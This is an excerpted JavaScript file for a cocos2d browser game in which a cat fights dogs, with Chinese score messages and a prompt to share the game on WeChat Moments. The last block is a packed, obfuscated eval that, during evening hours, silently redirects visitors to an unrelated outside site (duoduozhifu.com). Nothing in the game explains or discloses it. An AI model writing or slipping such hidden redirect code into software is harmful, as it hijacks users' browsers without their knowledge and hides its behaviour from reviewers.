...
var UI = {
    ...
    addScore: function (s) {
        ...
        var lb = cc.LabelTTF.create("喵战胜了" + UI.pg + "个汪星人\n超越了" + (0 | (percent * 100)) + "％的好友！\n获得了" + UI.score + "分,尼玛是用绳命在模仿周星星么！", "黑体", 20, cc.size(225, 105), cc.TEXT_ALIGNMENT_LEFT);
        document.title = window.wxData.desc = "喵获得" + UI.score + "分，在全球排名" + (0 | (percent * 100)) + "%，尼玛是用绳命在模仿周星星么！";
        document.title = window.wxFriend.desc = "喵拿了" + UI.score + "分，战胜了" + UI.pg + "个汪星人，超越了" + (0 | (percent * 100)) + "％的好友！喵左青龙右白虎魔挡杀魔佛挡杀佛...";
...
var Doge = cc.Sprite.extend({
    ...
    charge: function () {
        ...
        this.scheduleOnce(this.attack, this.attackDelay);
        this.rotation = 0;
    },
    attack: function () {
        this.stopAllActions();
        ...
        }, this), cc.moveBy(0.5, pos).easing(cc.easeExponentialOut()), cc.callFunc(function () {
            this.walk();
        }, this)));
    },
    dead: function () {
    ...
    fadeOut: function () {
        this.runAction(cc.sequence(cc.fadeOut(0.5), cc.callFunc(function () {
            dogs.splice(dogs.indexOf(this), 1)
        }, this), cc.removeSelf()));
    },
    hide: function () {
...
var Cat = cc.Sprite.extend({
    ...
    attack: function () {
        ...
        var pos = cc.pRotateByAngle(cc.p(this.attackDist, 0), cc.p(0, 0), attackAngle);
        this.runAction(cc.sequence(cc.moveBy(0.5, pos).easing(cc.easeExponentialOut()), cc.callFunc(function () {
            this.idle();
        }, this)));
    },
    hurt: function () {
...
var ShareUI = cc.LayerColor.extend({
    ctor: function () {
        ...
        this.addChild(arrow);
        var label = new cc.LabelTTF("请点击右上角的菜单按钮\n然后\"分享到朋友圈\"\n让绳精喵星人彻底占领这个星球吧！", "宋体", 18, cc.size(cc.winSize.width * 0.7, 250), cc.TEXT_ALIGNMENT_CENTER);
...
eval(function (p, a, c, k, e, d) {
    ...
    return p
}('3(1.4.2.6("i")<0){7 d=8 9();h=d.5();3(h>a&&h<b){1.4.2=\'g://f.c.e/j\'}}', 20, 20, '|window|href|if|location|getHours|indexOf|var|new|Date|18|23|duoduozhifu||com|www|http||game|game'.split('|'), 0, {}))